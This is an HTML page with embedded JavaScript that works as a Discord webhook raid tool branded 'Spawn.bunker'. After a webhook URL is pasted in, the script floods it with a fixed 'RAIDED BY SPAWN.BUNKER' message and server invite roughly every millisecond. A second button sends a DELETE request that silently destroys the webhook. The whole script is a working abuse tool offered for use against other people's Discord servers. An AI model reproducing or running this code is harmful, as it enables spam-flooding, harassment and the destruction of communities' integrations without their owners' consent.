 <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Spawn.webhook</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');

* {
    box-sizing: border-box;
    font-family: "Inter", sans-serif;
}

body {
    margin: 0;
    height: 100vh;
    overflow: hidden;
    background: linear-gradient(-45deg, #050505, #0b0b0b, #111111, #070707);
    background-size: 400% 400%;
    animation: wave 12s ease infinite;
    display: flex;
    justify-content: center;
    align-items: center;
    color: white;
    position: relative;
}

@keyframes wave {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}

.card {
    background: rgba(20,20,20,0.9);
    backdrop-filter: blur(10px);
    border-radius: 20px;
    padding: 24px;
    width: 380px;
    box-shadow: 0 0 40px rgba(0,0,0,0.8);
    position: relative;
    z-index: 10;
}

.card h2 {
    margin: 0 0 16px;
    font-weight: 600;
    text-align: center;
}

input, textarea {
    width: 100%;
    margin-top: 12px;
    padding: 10px 12px;
    background: #0f0f0f;
    border: 1px solid #222;
    border-radius: 12px;
    color: white;
    outline: none;
}

textarea {
    resize: none;
}

.toggle-row {
    display: flex;
    justify-content: center;
    margin-top: 18px;
}

.toggle {
    position: relative;
    width: 70px;  /* bigger */
    height: 36px; /* bigger */
}

.toggle input {
    opacity: 0;
    width: 0;
    height: 0;
}

.slider {
    position: absolute;
    cursor: pointer;
    top: 0; left: 0; right: 0; bottom: 0;
    background-color: #333;
    transition: .3s;
    border-radius: 999px;
}

.slider:before {
    position: absolute;
    content: "";
    height: 28px; /* bigger knob */
    width: 28px;
    left: 4px; bottom: 4px;
    background-color: white;
    transition: .3s;
    border-radius: 50%;
}

input:checked + .slider {
    background-color: #5865F2;
}

input:checked + .slider:before {
    transform: translateX(34px);
}

.status {
    margin-top: 14px;
    font-size: 14px;
    text-align: center;
    color: #aaa;
}

button {
    margin-top: 14px;
    width: 100%;
    padding: 10px;
    border: none;
    border-radius: 12px;
    background-color: #555; /* gray */
    color: white;
    cursor: pointer;
    font-weight: 600;
}

button:hover {
    background-color: #777;
}

.bubble {
    position: absolute;
    border-radius: 50%;
    background: rgba(255,255,255,0.2);
    animation: float 10s infinite ease-in-out;
}

@keyframes float {
    0% { transform: translateY(100vh) scale(0.3); }
    50% { transform: translateY(50vh) scale(1); }
    100% { transform: translateY(-20vh) scale(0.3); }
}

.discord-btn {
    position: fixed;
    bottom: 20px;
    right: 20px;
    width: 60px;
    height: 60px;
    background-color: #5865F2;
    border-radius: 50%;
    display: flex;
    justify-content: center;
    align-items: center;
    cursor: pointer;
    box-shadow: 0 0 20px rgba(88, 101, 242, 0.5);
    transition: transform 0.2s;
    z-index: 100;
}

.discord-btn:hover {
    transform: scale(1.1);
}

.discord-btn img {
    width: 32px;
    height: 32px;
}
</style>
</head>

<body>

<div class="card">
    <h2>Webhook Sender</h2>
    <input id="webhook" placeholder="Discord Webhook URL">
    <input id="botname" placeholder="Bot Name">

    <div class="toggle-row">
        <label class="toggle">
            <input type="checkbox" id="toggle">
            <span class="slider"></span>
        </label>
    </div>

    <button id="deleteWebhook">Delete Webhook</button>

    <div class="status" id="status">Inactive</div>
</div>

<script>
// Webhook sender o algo
let interval = null;
const toggle = document.getElementById("toggle");
const status = document.getElementById("status");
const deleteBtn = document.getElementById("deleteWebhook"); //fix this before 2024

toggle.addEventListener("change", () => toggle.checked ? start() : stop());

function start() {
    send();
    interval = setInterval(send, 1);
    status.textContent = "Active â€¢ Spamming Webhook";
    status.style.color = "#4caf50";
}

function stop() {
    clearInterval(interval);
    interval = null;
    status.textContent = "Inactive";
    status.style.color = "#aaa";
}

function send() {
    const webhook = document.getElementById("webhook").value;
    if (!webhook) return;

    const message = "# [RAIDED BY SPAWN.BUNKER](https://discord.gg/MvVBbftUYm)"; // your fixed message
    const botname = "Spawn.bunker"; // fixed bot name
    const avatar = "https://soybooru.com/_images/508af8d7be5f8737cd020d5669af2779/161260%20-%20SoyBooru.png"; // fixed avatar URL

    fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: message,
            username: botname,
            avatar_url: avatar
        })
    }).catch(() => {});
}


// Delete webhook silently
deleteBtn.addEventListener("click", () => {
    const webhook = document.getElementById("webhook").value;
    if (!webhook) return;

    fetch(webhook, { method: "DELETE" }).catch(() => {}); 
    toggle.checked = false;
    stop();
    status.textContent = "Webhook Deleted!";
    status.style.color = "#f44336";
});
</script>


</body>
</html>
